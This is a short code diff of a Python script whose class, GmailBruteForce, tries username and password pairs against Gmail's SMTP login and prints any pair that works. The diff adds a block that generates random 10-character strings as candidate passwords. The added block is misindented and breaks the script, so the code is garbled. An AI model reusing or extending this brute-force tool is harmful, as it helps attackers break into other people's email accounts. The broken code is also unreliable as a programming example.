@@ -1,5 +1,4 @@
 #!/usr/bin/python
-pip install six
 from __future__ import absolute_import
 from __future__ import print_function
 from six.moves import input
@@ -32,7 +31,16 @@ class GmailBruteForce():
                 try:
                     self.smtp.login(user,password)
                     print(("\033[1;37machei -> %s " % user + " -> %s \033[1;m" % password )) 
-			
+			import string,random
+ram =[]
+for i in range(1000):
+	senha = ''
+	for i in range(10):
+		senha+= random.choice(string.ascii_letters+' ')
+	if not senha in ram:
+		ram.append(senha)
+		print(senha)
+
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
